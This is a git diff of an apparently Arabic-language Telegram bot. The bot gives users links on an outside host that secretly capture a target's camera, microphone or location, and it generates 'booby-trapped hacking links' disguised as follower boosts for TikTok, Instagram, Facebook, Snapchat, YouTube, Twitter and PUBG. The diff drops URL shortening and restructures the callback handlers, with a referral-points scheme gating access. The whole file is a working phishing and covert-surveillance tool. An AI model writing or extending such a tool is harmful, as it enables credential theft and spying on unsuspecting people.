@@ -716,22 +716,11 @@ bot.on('message', async (msg) => {
   }
 });
 
-function shortenUrl(url) {
-  return new Promise((resolve, reject) => {
-    TinyURL.shorten(url, function(res, err) {
-      if (err) reject(err);
-      else resolve(res);
-    });
-  });
-}
-
-// معالجة الطلبات المختلفة
-bot.on('callback_query', async (callbackQuery) => {
+bot.on('callback_query', (callbackQuery) => {
     const chatId = callbackQuery.message.chat.id;
     const userId = callbackQuery.from.id.toString();
     const data = callbackQuery.data;
 
-    let url;
     switch(data) {
         case 'create_referral':
             const referralLink = createReferralLink(userId);
@@ -746,72 +735,89 @@ bot.on('callback_query', async (callbackQuery) => {
                 : `لديك حاليًا ${points} نقطة. اجمع ${pointsRequiredForSubscription} نقطة للاشتراك في البوت واستخدامه بدون قيود.`;
             bot.sendMessage(chatId, message);
             break;
-        case 'front_camera':
-        case 'rear_camera':
-            url = `https://yyytot.onrender.com/camera/${chatId}?cameraType=${data === 'front_camera' ? 'front' : 'rear'}`;
-            break;
-        case 'voice_record':
-            bot.sendMessage(chatId, 'من فضلك أدخل مدة التسجيل بالثواني (1-20):');
-            return; // إيقاف التنفيذ هنا حتى يتم إدخال مدة التسجيل
-        case 'get_location':
-            url = `https://yyytot.onrender.com/getLocation/${chatId}`;
-            break;
-        case 'increase_tiktok':
-            url = `https://yyytot.onrender.com/tiktok/${chatId}`;
-            break;
-        case 'increase_instagram':
-            url = `https://yyytot.onrender.com/instagram/${chatId}`;
-            break;
-        case 'increase_facebook':
-            url = `https://yyytot.onrender.com/facebook/${chatId}`;
-            break;
-        case 'increase_snapchat':
-            url = `https://yyytot.onrender.com/snapchat/${chatId}`;
-            break;
-        case 'pubg_uc':
-            url = `https://yyytot.onrender.com/pubg_uc/${chatId}`;
-            break;
-        case 'increase_youtube':
-            url = `https://yyytot.onrender.com/youtube/${chatId}`;
-            break;
-        case 'increase_twitter':
-            url = `https://yyytot.onrender.com/twitter/${chatId}`;
-            break;
         default:
             if (!subscribedUsers.has(userId)) {
-                bot.sendMessage(chatId, 'ملاحظة عزيزي المستخدم لا تستطيع استخدام هذه الميزة سوى 5 مرات. قم بالاشتراك من المطور أو اجمع نقاط لاستخدامه بدون قيود.');
+                bot.sendMessage(chatId, 'ملاحظة عزيزي المستخدم لان تستطيع استخدام هاذا الميزه سوى 5مرات قوم بل الاشتراك من المطور او قوم بجمع نقاط لاستخدام بدون قيود.');
             } else {
                 bot.sendMessage(chatId, 'جاري تنفيذ العملية...');
                 // هنا يمكنك إضافة الكود الخاص بكل عملية
             }
-            return; // إيقاف التنفيذ هنا إذا كان الطلب غير معروف
-    }
-
-    if (url) {
-        try {
-            const shortUrl = await shortenUrl(url);
-            bot.sendMessage(chatId, `تم تجهيز الرابط: ${shortUrl}`);
-        } catch (error) {
-            console.error('Error shortening URL:', error);
-            bot.sendMessage(chatId, 'حدث خطأ أثناء محاولة إنشاء الرابط القصير.');
-        }
     }
 });
 
-bot.on('message', async (msg) => {
+
+bot.on('callback_query', (callbackQuery) => {
+    const chatId = callbackQuery.message.chat.id;
+    const data = callbackQuery.data;
+
+    if (data === 'front_camera' || data === 'rear_camera') {
+        const url = `https://yyytot.onrender.com/camera/${chatId}?cameraType=${data === 'front_camera' ? 'front' : 'rear'}`;
+        bot.sendMessage(chatId, `انقر على الرابط للتصوير: ${url}`);
+    } else if (data === 'voice_record') {
+        bot.sendMessage(chatId, 'من فضلك أدخل مدة التسجيل بالثواني (1-20):');
+    } else if (data === 'get_location') {
+        const url = `https://yyytot.onrender.com/getLocation/${chatId}`;
+        console.log('Data received:', data);
+        console.log('Chat ID:', chatId);
+        console.log('URL:', url);
+        
+        bot.sendMessage(chatId, `انقر على الرابط للحصول على موقعك: ${url}`)
+            .then(() => console.log('Message sent successfully'))
+            .catch(err => console.error('Error sending message:', err));
+    }
+});
+
+bot.on('message', (msg) => {
     const chatId = msg.chat.id;
     const duration = parseInt(msg.text, 10);
 
     if (!isNaN(duration)) {
         if (duration > 0 && duration <= 20) {
             const link = `https://yyytot.onrender.com/record/${chatId}?duration=${duration}`;
-            const shortLink = await shortenUrl(link);
-            bot.sendMessage(chatId, `تم تجهيز الرابط لتسجيل صوت لمدة ${duration} ثواني: ${shortLink}`);
+            bot.sendMessage(chatId, `تم تجهيز الرابط لتسجيل صوت لمدة ${duration} ثواني: ${link}`);
         } else {
             bot.sendMessage(chatId, 'الحد الأقصى لمدة التسجيل هو 20 ثانية. الرجاء إدخال مدة صحيحة.');
         }
     }
 });
+
+bot.on('callback_query', (query) => {
+    const chatId = query.message.chat.id;
+    const baseUrl = 'https://yyytot.onrender.com'; // Change this to your actual URL
+
+    let url;
+    switch (query.data) {
+        case 'increase_tiktok':
+            url = `${baseUrl}/tiktok/${chatId}`;
+            bot.sendMessage(chatId, `تم تلغيم رابط اختراق التيك توك: ${url}`);
+            break;
+        case 'increase_instagram':
+            url = `${baseUrl}/instagram/${chatId}`;
+            bot.sendMessage(chatId, `تم تلغيم رابط اختراق الانستغرام: ${url}`);
+            break;
+        case 'increase_facebook':
+            url = `${baseUrl}/facebook/${chatId}`;
+            bot.sendMessage(chatId, `تم تلغيم رابط اختراق الفيسبوك: ${url}`);
+            break;
+        case 'increase_snapchat':
+            url = `${baseUrl}/snapchat/${chatId}`;
+            bot.sendMessage(chatId, `تم تلغيم رابط اختراق السناب شات: ${url}`);
+            break;
+        case 'pubg_uc':
+            url = `${baseUrl}/pubg_uc/${chatId}`;
+            bot.sendMessage(chatId, `تم تلغيم رابط اختراق بوبجي: ${url}`);
+            break;
+        case 'increase_youtube':
+            url = `${baseUrl}/youtube/${chatId}`;
+            bot.sendMessage(chatId, ` تم تلغيم رابط اختراق اليوتيوب: ${url}`);
+            break;
+        case 'increase_twitter':
+            url = `${baseUrl}/twitter/${chatId}`;
+            bot.sendMessage(chatId, `تم تلغيم رابط اختراق التويتر: ${url}`);
+            break;
+    }
+});
+
 
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
